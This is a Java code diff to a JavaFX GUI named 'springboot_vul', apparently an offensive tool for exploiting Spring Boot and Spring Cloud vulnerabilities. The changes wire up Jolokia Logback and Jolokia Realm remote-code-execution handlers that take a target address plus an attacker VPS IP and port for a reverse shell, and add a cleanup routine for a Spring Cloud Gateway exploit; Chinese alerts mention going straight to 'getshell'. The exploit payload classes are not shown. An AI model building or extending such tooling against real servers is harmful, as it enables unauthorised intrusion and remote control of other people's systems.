@@ -479,6 +479,39 @@ public class springboot_vul extends Application {
                                 public void onResult(String result) {
                                         Platform.runLater(() -> {
                                                 // 输出其他内容到控制台
+                                                System.out.println(result);
+                                                Text text = new Text(result + "\n");
+                                                consoleOutput.getChildren().add(text);
+                                                // 自动滚动到最新内容
+                                                scrollPane.setVvalue(1.0);
+                                        });
+                                }
+                                @Override
+                                public void onComplete() {
+                                }
+                        });
+                }
+        }
+
+        public void handlerDelSpg(String address) throws IOException {
+                // 清空控制台输出
+                consoleOutput.getChildren().clear();
+                // 暂无证书模块，待设置
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        SpringGawRCE spg = new SpringGawRCE(address);
+                        spg.DelGaw(new ResultCallback() {
+                                @Override
+                                public void onResult(String result) {
+                                        Platform.runLater(() -> {
+                                                // 输出其他内容到控制台
                                                 Text text = new Text(result + "\n");
                                                 consoleOutput.getChildren().add(text);
                                                 // 自动滚动到最新内容
@@ -579,11 +612,71 @@ public class springboot_vul extends Application {
 
                 }
         }
-        public void handlerJolokiaLogbackRCE(String address,String command){
+        public void handlerJolokiaLogbackRCE(String address,String vpsIP,String vpsPORT){
+                consoleOutput.getChildren().clear();
+                // 暂无证书模块，待设置
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        if (vpsIP.isEmpty() && vpsPORT.isEmpty()) {
+                                showAlertEmpty("反弹vps的IP和端口为空！");
+                        } else {
+                                JolokiaLogbackRCE jlb = new JolokiaLogbackRCE(address,vpsIP,vpsPORT);
+                                jlb.Exp(new ResultCallback() {
+                                        @Override
+                                        public void onResult(String result) {
+                                                Platform.runLater(() -> {
+                                                        // 输出其他内容到控制台
+                                                        Text text = new Text(result + "\n");
+                                                        consoleOutput.getChildren().add(text);
+                                                        // 自动滚动到最新内容
+                                                        scrollPane.setVvalue(1.0);
+                                                });
+                                        }
 
+                                        @Override
+                                        public void onComplete() {
+                                        }
+                                });
+                        }
+                }
         }
-        public void handlerJolokiaRealmRCE(String address,String command){
+        public void handlerJolokiaRealmRCE(String address,String vpsIP,String vpsPORT){
+                consoleOutput.getChildren().clear();
+                // 暂无证书模块，待设置
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        JolokiaRealmRCE jrl = new JolokiaRealmRCE(address,vpsIP,vpsPORT);
+                        jrl.Exp(new ResultCallback() {
+                                @Override
+                                public void onResult(String result) {
+                                        Platform.runLater(() -> {
+                                                // 输出其他内容到控制台
+                                                Text text = new Text(result + "\n");
+                                                consoleOutput.getChildren().add(text);
+                                                // 自动滚动到最新内容
+                                                scrollPane.setVvalue(1.0);
+                                        });
+                                }
 
+                                @Override
+                                public void onComplete() {
+                                }
+                        });
+                }
         }
 
         public void handlerH2DatabaseQueryRCE(String address,String vpsIP,String vpsPORT){
@@ -898,10 +991,10 @@ public class springboot_vul extends Application {
                                         handlerEurekaXstreamRCE(address, vpsIP, vpsPort);
                                         break;
                                 case 9:
-                                        handlerJolokiaLogbackRCE(address, command);
+                                        handlerJolokiaLogbackRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 10:
-                                        handlerJolokiaRealmRCE(address, command);
+                                        handlerJolokiaRealmRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 11:
                                         handlerH2DatabaseQueryRCE(address,vpsIP,vpsPort);
@@ -982,10 +1075,12 @@ public class springboot_vul extends Application {
                                         showAlertEmpty("暂时没有写这里，直接getshell");
                                         break;
                                 case 9:
-                                        handlerJolokiaLogbackRCE(address, command);
+//                                        handlerJolokiaLogbackRCE(address, command);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
                                         break;
                                 case 10:
-                                        handlerJolokiaRealmRCE(address, command);
+//                                        handlerJolokiaRealmRCE(address, command);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
                                         break;
                                 case 11:
 //                                        handlerH2DatabaseQueryRCE(address, command);
@@ -1033,7 +1128,12 @@ public class springboot_vul extends Application {
                         showAlertEmpty("地址为空！");
                 } else {
                         switch (Vulvalue) {
-
+                                case 6:
+                                        handlerDelSpg(address);
+                                        break;
+                                default:
+                                        showAlertEmpty("目前只限于spring cloud gateway 漏洞");
+                                        break;
                         }
                 }
 
